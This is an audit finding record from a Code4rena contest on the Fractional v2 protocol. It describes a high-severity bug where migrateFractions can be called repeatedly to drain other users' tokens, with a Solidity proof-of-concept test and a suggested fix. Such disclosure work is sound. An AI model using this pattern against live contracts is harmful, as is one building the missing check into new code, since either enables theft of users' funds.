---
# Core Classification
protocol: Fractional
chain: everychain
category: logic
vulnerability_type: business_logic

# Attack Vector Details
attack_type: business_logic
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 2997
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2022-07-fractional-v2-contest
source_link: https://code4rena.com/reports/2022-07-fractional
github_link: https://github.com/code-423n4/2022-07-fractional-findings/issues/467

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 1.00
financial_impact: high

# Scoring
quality_score: 5
rarity_score: 3

# Context Tags
tags:
  - business_logic

protocol_categories:
  - dexes
  - bridge
  - yield
  - launchpad
  - synthetics

# Audit Details
report_date: unknown
finders_count: 14
finders:
  - panprog
  - 0x52
  - auditor0517
  - Ruhum
  - xiaoming90
---

## Vulnerability Title

[H-16] ```migrateFractions``` may be called more than once by the same user which may lead to loss of tokens for other users

### Overview


This bug report details a vulnerability in the ```Migration.sol``` contract in the code-423n4/2022-07-fractional repository. This contract is used to send new vault tokens to a user based on the amount of ETH and fractions they contributed to a migration proposal. The vulnerability is that the function does not check if the user had already called it, allowing them to gain more new vault tokens than they are owed. This could result in other users not being able to get their new tokens. 

To prove the vulnerability, test code was added to ```Migrations.t.sol``` which showed the first user (Alice) migrating their tokens to the new vault twice before the second user (Bob) called ```migrateFractions``` which then failed. 

The recommended mitigation step is to set the ```userProposalEth``` and ```userProposalFractions``` to 0 after the user's tokens have been migrated. This would prevent users from gaining more tokens than they are owed.

### Original Finding Content

_Submitted by dipp, also found by 0x52, ak1, auditor0517, hansfriese, jonatascm, kenzo, Lambda, panprog, PwnedNoMore, Ruhum, smiling&#95;heretic, Treasure-Seeker, and xiaoming90_

The `migrateFractions` function in the `Migration.sol` contract is used to send new vault tokens to the user calculated based on the amount of ETH and fractions the user contributed to the migration proposal. After it is called once the user should have all the new vault tokens owed to them.

Since the function does not check if the user had already called it, a user may call it more than once, allowing them to gain more new vault tokens than they are owed. If a user repeatedly uses this function to gain new tokens then other users may not be able to get their new tokens.

### Proof of Concept

Test code added to `Migrations.t.sol`:

The test code below shows the first user (Alice) migrating their tokens to the new vault twice before the second user (Bob) calls `migrateFractions` which then fails.

```solidity
	function testMigrateFractionsAgain() public {
        // Setup
        testSettle();
        (, , , , address newVault, , , , ) = migrationModule.migrationInfo(
            vault,
            1
        );
        (address newToken, uint256 id) = registry.vaultToToken(newVault);

        // First user migrates fractions twice
        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2);            // Confirm Migration has all new tokens

        assertEq(getFractionBalance(alice.addr), 4000);                         // Alice joined with 1 ether and 1000 fractions
        alice.migrationModule.migrateFractions(vault, 1);
        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 6000);           // Alice's shares == 6000

        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2 - 6000);            // Confirm Migration loses new tokens

        alice.migrationModule.migrateFractions(vault, 1);
        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 12000);          // Confirm Alice gains 6000 new tokens again

        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), 8000);            // Confirm Migration loses new tokens

        // Second user attempts to migrate fractions
        assertEq(getFractionBalance(bob.addr), 0);                              // Bob joined with 1 ether and 5000 fractions (all of his fractions)
        vm.expectRevert(stdError.arithmeticError);
        bob.migrationModule.migrateFractions(vault, 1);                         // Bob is unable to call migrateFractions and gain new tokens because the migration module does not contain enough tokens
        assertEq(IERC1155(newToken).balanceOf(bob.addr, id), 0);                // Confirm Bob does not gain any new tokens (supposed to gain 14,000 tokens)
    }
```

#### Recommended Mitigation Steps

A possible fix might be to set the `userProposalEth` and `userProposalFractions` to 0 after the user's tokens have been migrated.

**[mehtaculous (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/460)**

**[HardlyDifficult (judge) increased severity to High and commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/467#issuecomment-1212267561):**
> `migrateFractions` can be called multiple times, stealing funds from other users. This is a High risk issue.
> 
> Selecting this submission as the primary for including a clear POC.



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 5/5 |
| Rarity Score | 3/5 |
| Audit Firm | Code4rena |
| Protocol | Fractional |
| Report Date | N/A |
| Finders | panprog, 0x52, auditor0517, Ruhum, xiaoming90, Lambda, smiling_heretic, hansfriese, dipp, ak1, Treasure-Seeker, PwnedNoMore, jonatascm, kenzo |

### Source Links

- **Source**: https://code4rena.com/reports/2022-07-fractional
- **GitHub**: https://github.com/code-423n4/2022-07-fractional-findings/issues/467
- **Contest**: https://code4rena.com/contests/2022-07-fractional-v2-contest

### Keywords for Search

`Business Logic`

